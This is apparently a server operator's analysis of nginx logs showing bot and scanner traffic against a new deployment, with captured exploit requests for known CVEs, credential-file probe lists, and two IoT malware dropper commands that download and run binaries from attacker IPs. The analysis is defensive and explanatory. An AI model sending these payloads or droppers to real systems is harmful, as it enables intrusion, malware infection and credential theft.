# NGINX Log Analysis: Bot and Scanner Activity

Analysis of bot traffic hitting the Field Day server within hours of
deployment. The server runs a Go binary behind nginx on Fedora 44,
proxied through Cloudflare. None of these attacks can affect the
server — it has no PHP, Apache, Docker, or IoT firmware.

## Scan 1: 2026-06-27 (first 4 hours)

- **Server IP:** 5.161.60.14 (Hetzner)
- **Period:** 15:13 – 19:07 UTC (3h 54m)
- **Total requests:** 139 (approximately 30 legitimate)
- **Attack IPs:** 6 unique sources

### Reconnaissance scanners

| Scanner | IP | Description |
|---|---|---|
| CensysInspect | 66.132.172.189 | Internet-wide service indexing |
| Shodan | 176.65.139.66 | Internet-wide service indexing |
| Palo Alto Cortex Xpanse | 147.185.132.252 | Enterprise attack surface management |
| zgrab | 103.203.57.3, 40.124.173.6 | Open-source application scanner |
| Tencent Cloud bots | 43.153.74.75, 43.130.174.37, 43.130.57.46 | Spoofed iPhone user-agents from Chinese cloud IPs |

These are well-known internet scanners that continuously index every
public IP. They catalog services but don't attempt exploitation.

### Attack attempts

Two IPs (`167.86.80.37` and `212.127.90.201`) ran identical 30+
request attack scripts — likely the same botnet. User-agent:
`libredtail-http`. A third IP (`138.197.87.21`) ran a separate IoT
router attack.

#### 1. Apache path traversal (CVE-2021-41773 / CVE-2021-42013)

```
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/.../bin/sh
```

Path traversal using URL-encoded `..` sequences to escape the web
root and reach `/bin/sh`. The double-encoded variant (`%%32%65`)
bypasses Apache's incomplete initial fix. Only affects Apache httpd
2.4.49–2.4.50.

#### 2. PHPUnit eval-stdin.php (CVE-2017-9841)

```
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
GET /{laravel,cms,admin,blog,...}/vendor/phpunit/.../eval-stdin.php
```

Sprays ~30 common web app directory prefixes looking for PHPUnit's
`eval-stdin.php`, which executes arbitrary PHP from the POST body.
Nine years old but still the most common PHP vulnerability scan
because developers frequently expose `vendor/` directories.

#### 3. PHP-CGI argument injection (CVE-2024-4577)

```
POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
```

The `%AD` soft-hyphen character is interpreted as a dash by PHP-CGI
on Windows, turning query strings into CLI arguments. This enables
`allow_url_include=1` and `auto_prepend_file=php://input`, allowing
arbitrary PHP execution via the POST body. Disclosed June 2024.

#### 4. ThinkPHP RCE (CVE-2018-20062)

```
GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
```

Fingerprinting probe for ThinkPHP (Chinese PHP framework). The
`md5("Hello")` call is a test — if the response contains the known
hash, the bot sends the real payload. Common in Asian botnet
scanning.

#### 5. PHP pearcmd Local File Inclusion

```
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
GET /index.php?lang=../../../../../../../../tmp/index1
```

Two-step attack: first request abuses PHP's built-in `pearcmd.php`
via Local File Inclusion to write a webshell to `/tmp/index1.php`.
Second request includes that file to execute it. This technique
gained popularity in 2022–2023 because it weaponizes a tool already
on the system without needing file upload.

#### 6. Docker API exposure

```
GET /containers/json
```

Probing for an exposed Docker daemon REST API. If found without
authentication, attackers can create privileged containers, mount
the host filesystem, and gain full host access.

#### 7. BOA web server / router login

```
POST /boaform/admin/formLogin
```

From `138.197.87.21`. Targeting BOA, a lightweight HTTP server used
in IoT devices and home routers. Credential stuffing spray hoping
to find unpatched routers or cameras.

#### 8. SAP NetWeaver (CVE-2025-31324)

```
GET /developmentserver/metadatauploader
```

Probing for a critical (CVSS 10.0) unauthenticated file upload in
SAP NetWeaver Visual Composer. This CVE is from April 2025 — only
two months old at the time of this scan, already being mass-scanned.

### Observations

- All attack traffic arrived via the **bare IP** (bypassing
  Cloudflare), not via `fieldday.pavelanni.dev`.
- The `libredtail-http` botnet runs a comprehensive multi-exploit
  script covering PHP, Apache, Docker, and Chinese frameworks in
  a single pass.
- The CVE age range spans 2017–2025, showing that botnets maintain
  a long tail of exploits — old vulnerabilities remain profitable
  because unpatched servers persist.
- The newest exploit (SAP CVE-2025-31324) was being mass-scanned
  within two months of disclosure.

---

## Scan 2: 2026-06-28 (after 31 hours)

- **Period:** 15:13 Jun 27 – 22:17 Jun 28 UTC (31h 04m)
- **Total requests:** 1,211 (up from 139 — a 8.7x increase)
- **Requests per day:** 279 (Jun 27, partial), 932 (Jun 28)
- **Attack IPs:** 20+ unique sources
- **Legitimate visitor requests:** ~26 (form submissions, lookups)

The most notable finding in the second scan is the emergence of
**AI tool configuration scanning** — a new attack category not
present in the first four hours.

### New reconnaissance scanners

| Scanner | IP | Description |
|---|---|---|
| LeakIX (l9scan) | 92.118.39.57 | Leak and exposure search engine |
| Nokia GenomeCrawler | various | Nokia's internet mapping project |
| Infrawatch | various | Infrastructure monitoring scanner |
| Umai Scanner | various | Web security scanner |
| visionheight.com | various | Web scanning service |
| Google Read Aloud | various | Google's accessibility content reader |

### New attack patterns

#### 9. AI/MCP configuration file scanning (NEW)

```
/.claude/config.json          /.claude/mcp.json
/.claude/settings.local.json  /.config/claude/config.json
/.cursor/mcp.json             /.cursor/mcp_config.json
/.mcp/config.json             /.mcp/settings.json
/.vscode/mcp.json             /claude_desktop_config.json
/.well-known/agent.json       /.well-known/mcp.json
/mcp.json                     /mcp_config.json
/v1/models                    /invocations
```

Multiple IPs (`148.113.200.133`, `45.159.230.92`, `91.107.123.111`,
`172.93.106.153`, `194.180.48.253`) are scanning for **Claude Code**,
**Cursor**, and **MCP (Model Context Protocol)** configuration
files. These files can contain API keys, server endpoints, and tool
configurations. The `/v1/models` and `/invocations` probes suggest
attackers are also looking for exposed LLM inference endpoints.

This is a **brand new attack category** — these tools didn't exist
or weren't widely deployed a year ago. The speed at which scanners
adapted to look for AI tool configs is remarkable.

#### 10. Secrets and credential file harvesting

```
/.env               /.env.prod          /.env.backup
/.env.local         /.env.staging       /.env.development
/.aws/credentials   /.aws/config        /aws-credentials
/.ssh/id_rsa        /.ssh/id_ed25519    /.ssh/id_ecdsa
/.git/config        /.git/HEAD          /.git-credentials
/key.pem            /private_key        /server.key
/ssh_key            /.pem               /proc/self/environ
```

The top scanner (`148.113.200.133`, 236 requests) ran an exhaustive
credential harvesting script trying every common secret file path.
This goes far beyond `.env` — it covers SSH keys, AWS credentials,
Git credentials, PEM files, and even `/proc/self/environ` (Linux
process environment variables via procfs).

#### 11. Kubernetes and container orchestration probes

```
/.kube/config
/api/v1/secrets
/api/v1/namespaces/default/secrets
/api/v1/namespaces/kube-system/secrets
/api/v1/namespaces/default/configmaps
/api/v1/namespaces/kube-system/configmaps
/kubeconfig
/v2/_catalog
```

Multiple IPs probing for exposed Kubernetes API servers and Docker
registries. The `/api/v1/secrets` and `/api/v1/namespaces/*/secrets`
paths would dump all Kubernetes secrets if the API server were
exposed without authentication. The `/v2/_catalog` path targets
exposed Docker registries.

#### 12. Terraform / Infrastructure-as-Code state files

```
/terraform.tfstate              /terraform.tfstate.backup
/.terraform/terraform.tfstate   /state.tfstate
/infra/terraform.tfstate        /deploy/terraform.tfstate
/backup/terraform.tfstate       /iac/terraform.tfstate
```

Terraform state files contain the full infrastructure graph
including cloud provider credentials, database passwords, and API
keys in plaintext. Scanning for these under multiple directory
prefixes.

#### 13. CI/CD pipeline configuration harvesting

```
/.github/workflows/deploy.yml   /.github/workflows/release.yml
/.gitlab-ci.yml                 /Jenkinsfile
/jenkins/config.xml             /.circleci/config.yml
/.drone.yml                     /.travis.yml
/.woodpecker.yml                /wercker.yml
/appveyor.yml                   /azure-pipelines.yml
/appspec.yml
```

CI/CD configs often contain deployment secrets, registry
credentials, and cloud provider tokens. The scanner
(`148.113.200.133`) tried every major CI platform's config path.

#### 14. VPN and remote access probes

```
/+CSCOE+/logon.html                (Cisco ASA WebVPN)
/remote/login                      (Fortinet FortiGate SSL VPN)
/owa/auth/logon.aspx                (Microsoft Outlook Web Access)
/sra_{BA195980-CD49-...}/          (SonicWall SRA)
/autodiscover/autodiscover.json     (Exchange autodiscover SSRF)
```

Looking for enterprise VPN and email login portals. The
`autodiscover.json?@zdi/Powershell` probe targets **ProxyShell**
(CVE-2021-34473), a critical Microsoft Exchange SSRF vulnerability.

#### 15. IoT malware delivery (Mozi and Kaizen botnets)

```
GET /shell?cd+/tmp;rm+-rf+*;wget+http://196.251.121.142/a3f8d2/kaizen.arm;
    chmod+777+kaizen.arm;./kaizen.arm
GET /setup.cgi?...cmd=rm+-rf+/tmp/*;wget+http://103.174.243.225:36146/Mozi.m;
    -O+/tmp/netgear;sh+netgear
```

These are **actual malware delivery attempts**, not just probes.
**Mozi** is a P2P IoT botnet that infects routers and DVRs via
known vulnerabilities. **Kaizen** is a Mirai variant targeting ARM
devices. Both download and execute malware binaries in a single
request — wipe `/tmp`, download the payload, make it executable,
run it. The `.arm` suffix in `kaizen.arm` targets ARM-based IoT
devices.

#### 16. Cobalt Strike / C2 framework detection

```
GET stager64
GET /SiteLoader
GET /mPlayer
```

From `185.213.175.171`. These are **Cobalt Strike beacon
detection** probes — checking whether the server is running a
command-and-control framework. `stager64` is the default Cobalt
Strike stager URL. This scanner is looking for *other attackers'*
infrastructure, not trying to attack us.

#### 17. Application framework probes

```
/actuator/env            (Spring Boot Actuator)
/actuator/health         (Spring Boot Actuator)
/actuator/logfile        (Spring Boot Actuator)
/telescope/requests      (Laravel Telescope)
/storage/logs/laravel.log (Laravel log files)
/server-status           (Apache mod_status)
/manager/html            (Tomcat Manager)
/trace.axd               (ASP.NET trace viewer)
/wp-config.php           (WordPress, multiple backup variants)
/sites/default/settings.php (Drupal)
```

Standard web framework vulnerability scanning. The Spring Boot
Actuator probes are particularly dangerous — `/actuator/env`
exposes all environment variables (including secrets) if the
actuator is enabled without authentication.

### Observations (Scan 2)

- **Volume scaled 8.7x** from 139 to 1,211 requests in 31 hours.
  Once Shodan and Censys indexed the IP, the attack bots followed
  within hours.

- **AI tool config scanning is the new frontier.** Bots now
  specifically hunt for Claude, Cursor, and MCP configuration
  files. These configs can contain API keys worth hundreds of
  dollars. This attack category didn't exist a year ago.

- **The credential harvesting playbook is comprehensive.** A single
  scanner (`148.113.200.133`) tried 236 paths covering `.env`
  files, SSH keys, AWS credentials, Kubernetes secrets, Terraform
  state, CI/CD configs, Docker configs, and AI tool configs — all
  in one pass.

- **Two live malware delivery attempts** (Mozi and Kaizen botnets)
  were observed, targeting IoT devices. These are not probes —
  they attempt to download and execute binaries immediately.

- **Attackers scan for other attackers.** The Cobalt Strike
  detection probes (`stager64`, `/SiteLoader`) show that some
  scanners are mapping C2 infrastructure, not attacking directly.

- **Everything bypassed Cloudflare.** All attack traffic hit the
  bare IP (port 80), not the proxied domain. Cloudflare protects
  the hostname but can't protect the IP from direct scanning.

---

## Summary across both scans

| Metric | Scan 1 (4h) | Scan 2 (31h) |
|---|---|---|
| Total requests | 139 | 1,211 |
| Attack IPs | 6 | 20+ |
| Unique attack paths | ~40 | 200+ |
| Attack categories | 8 | 17 |
| CVE range | 2017–2025 | 2017–2025 |
| Malware delivery attempts | 0 | 2 |
| AI tool config probes | 0 | 30+ |

### Key takeaways

1. **Any public IP gets attacked within minutes.** Reconnaissance
   scanners (Shodan, Censys) index new IPs almost immediately.
   Exploit bots follow within hours.

2. **The long tail of CVEs is real.** Bots still carry 2017-era
   exploits (PHPUnit) alongside 2025 exploits (SAP NetWeaver)
   because unpatched servers persist across the internet.

3. **AI tooling is now a target.** Configuration files for Claude,
   Cursor, and MCP servers are being actively scanned — a brand
   new category that reflects how quickly the attack surface
   adapts to new technology adoption.

4. **Defense in depth works.** This Go binary behind nginx is
   immune to every attack observed. No PHP runtime, no exposed
   admin panels, no secrets on the web path, no Docker API. The
   attack surface is effectively zero.

5. **Cloudflare protects the domain, not the IP.** All attacks
   arrived via the bare IP address. For maximum protection, use
   Cloudflare's IP access rules or firewall rules to restrict
   port 80/443 to only Cloudflare's IP ranges.
